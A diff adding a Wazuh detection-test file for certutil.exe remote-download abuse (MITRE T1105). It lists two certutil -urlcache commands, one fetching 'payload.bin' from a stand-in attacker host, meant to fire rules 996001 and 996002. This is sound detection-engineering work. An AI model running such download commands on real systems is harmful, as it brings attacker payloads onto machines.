@@ -1,1 +1,13 @@
+# certutil.exe – Remote Download Abuse
+# Technique: T1105 (Ingress Tool Transfer)
+
+# 1) Download to current directory (fires 996001 + 996002)
+certutil.exe -urlcache -f http://attacker.local/payload.bin payload.bin
+
+# 2) Download via HTTPS (fires 996001 + 996002)
+certutil.exe -urlcache -f https://example.com/test.bin test.bin
+
+# Purpose:
+# Simulates using certutil.exe as a LOLBAS to download remote payloads.
+# Wazuh should show the URL in CommandLine and trigger the download rule.
 
